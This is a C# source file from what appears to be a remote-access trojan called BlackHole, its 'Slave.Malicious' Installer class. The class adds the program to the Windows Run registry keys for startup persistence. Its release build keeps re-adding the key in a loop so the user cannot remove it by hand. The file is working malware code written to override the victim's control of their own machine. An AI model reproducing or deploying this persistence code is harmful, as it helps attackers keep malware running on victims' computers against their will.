using BlackHole.Common;
using BlackHole.Slave.Helper;
using Microsoft.Win32;
using System.Threading.Tasks;
using System;

namespace BlackHole.Slave.Malicious
{
    /// <summary>
    /// 
    /// </summary>
    public sealed class Installer : Singleton<Installer>, IMalicious
    {
        /// <summary>
        /// 
        /// </summary>
        public void Initialize()
        {
            CheckStartup();
        }

        private void CheckStartup()
        {
#if !DEBUG
            AddToStartup();

            // Persistence, the use wont be able to remove the startupkey manually
            Task.Delay(TimeSpan.FromMilliseconds(100));
            Task.Factory.StartNew(CheckStartup);
#endif
        }

        private static string HKLMPath => PlatformHelper.Is64Bit
                ? "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
                : "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

        /// <summary>
        /// 
        /// </summary>
        /// <returns></returns>
        public static bool AddToStartup()
        {
            if (WindowsHelper.AccountType == "Admin")
            {
                if (RegistryHelper.AddRegistryKeyValue(RegistryHive.LocalMachine, HKLMPath,
                    MaliciousHelper.StartupKey, MaliciousHelper.ApplicationPath, true))
                    return true;
            }

            return RegistryHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", MaliciousHelper.StartupKey, MaliciousHelper.ApplicationPath,
                    true);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <returns></returns>
        public static bool RemoveFromStartup()
        {
            if (WindowsHelper.AccountType == "Admin")
            {
                if (RegistryHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine, HKLMPath,
                    MaliciousHelper.StartupKey))
                    return true;
            }

            return RegistryHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run", MaliciousHelper.StartupKey);
        }
    }
}
